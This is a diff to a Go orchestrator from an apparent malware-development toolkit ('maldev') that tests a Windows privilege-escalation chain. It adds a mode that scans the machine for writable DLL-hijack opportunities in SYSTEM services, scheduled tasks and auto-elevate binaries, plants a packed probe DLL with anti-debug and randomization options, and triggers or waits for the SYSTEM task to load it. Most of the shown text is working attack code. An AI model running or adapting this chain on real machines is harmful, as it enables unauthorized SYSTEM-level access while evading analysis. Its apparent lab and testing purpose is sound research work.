@@ -53,6 +53,7 @@ import (
 	"github.com/oioio-space/maldev/pe/dllproxy"
 	"github.com/oioio-space/maldev/pe/packer"
 	"github.com/oioio-space/maldev/pe/parse"
+	"github.com/oioio-space/maldev/recon/dllhijack"
 )
 
 //go:embed probe/probe.exe
@@ -65,12 +66,13 @@ const (
 	defaultDLLPath    = `C:\Vulnerable\hijackme.dll`
 	defaultMarkerPath = `C:\ProgramData\maldev-marker\whoami.txt`
 	defaultTaskName   = `MaldevHijackVictim`
-	pollTimeout       = 30 * time.Second
+	pollTimeout       = 90 * time.Second // task self-triggers every minute, allow ≥1 cycle
 	pollInterval      = 500 * time.Millisecond
 )
 
 func main() {
-	dllPath := flag.String("dll", defaultDLLPath, "where to plant the hijack DLL")
+	autoDiscover := flag.Bool("discover", false, "use recon/dllhijack to scan the box for live hijack opportunities, pick highest-ranked Writable target instead of -dll")
+	dllPath := flag.String("dll", defaultDLLPath, "where to plant the hijack DLL (overridden when -discover is set)")
 	markerPath := flag.String("marker", defaultMarkerPath, "where the probe will write whoami output")
 	taskName := flag.String("task", defaultTaskName, "scheduled task to trigger (must be SYSTEM-context, lowuser-runnable)")
 	noTrigger := flag.Bool("no-trigger", false, "plant the DLL but do not /Run the task — manual trigger expected")
@@ -84,6 +86,42 @@ func main() {
 	logStep("== maldev privesc-e2e orchestrator ==")
 	logStep("running as: %s", currentUser())
 	logStep("probe payload: %d bytes", len(probeBytes))
+
+	// Live discovery via recon/dllhijack — eat our own dog food.
+	// Orchestrator scans the box for sideload-vulnerable processes,
+	// services, scheduled tasks, and auto-elevate opportunities, then
+	// picks the highest-ranked one with a writable search dir.
+	if *autoDiscover {
+		logStep("scanning the box for hijack opportunities (recon/dllhijack.ScanAll)")
+		opps, err := dllhijack.ScanAll()
+		if err != nil {
+			fatal("dllhijack.ScanAll: %v", err)
+		}
+		opps = dllhijack.Rank(opps)
+		var best *dllhijack.Opportunity
+		for i := range opps {
+			if opps[i].Writable && (opps[i].IntegrityGain || opps[i].AutoElevate) {
+				best = &opps[i]
+				break
+			}
+		}
+		if best == nil {
+			// Fall back to any writable opportunity (no integrity gain
+			// but proves the path).
+			for i := range opps {
+				if opps[i].Writable {
+					best = &opps[i]
+					break
+				}
+			}
+		}
+		if best == nil {
+			fatal("no writable hijack opportunities found on this box (scanned %d total)", len(opps))
+		}
+		logStep("picked: kind=%s id=%s binary=%s hijack-as=%s integrity-gain=%v",
+			best.Kind, best.ID, best.BinaryPath, best.HijackedDLL, best.IntegrityGain)
+		*dllPath = best.HijackedPath
+	}
 	logStep("pack mode: %d (compress=%v antidebug=%v randomize=%v)", *mode, *compress, *antiDebug, *randomize)
 
 	packOpts := packer.PackBinaryOptions{
@@ -175,16 +213,20 @@ func main() {
 	_ = os.Remove(*markerPath)
 	logStep("wiped old marker %s", *markerPath)
 
-	// 4. Trigger
+	// 4. Trigger — lowuser cannot /Run a SYSTEM-context task (RPC ACL
+	// is distinct from the file ACL we patched). The provisioning
+	// script set the task to auto-fire every minute; we just wait one
+	// cycle. Best-effort /Run as a courtesy in case the caller IS
+	// privileged enough — silently ignore Access Denied.
 	if *noTrigger {
-		logStep("--no-trigger set; expecting external trigger of task %q", *taskName)
+		logStep("--no-trigger set; waiting for the task's natural minute-trigger")
 	} else {
-		logStep("triggering scheduled task %q", *taskName)
 		out, err := exec.Command("schtasks", "/Run", "/TN", *taskName).CombinedOutput()
-		if err != nil {
-			fatal("schtasks /Run %s: %v\noutput: %s", *taskName, err, out)
+		if err == nil {
+			logStep("schtasks /Run succeeded: %s", strings.TrimSpace(string(out)))
+		} else {
+			logStep("schtasks /Run denied (expected as lowuser); falling back to natural trigger")
 		}
-		logStep("schtasks output: %s", strings.TrimSpace(string(out)))
 	}
 
 	// 5. Poll marker
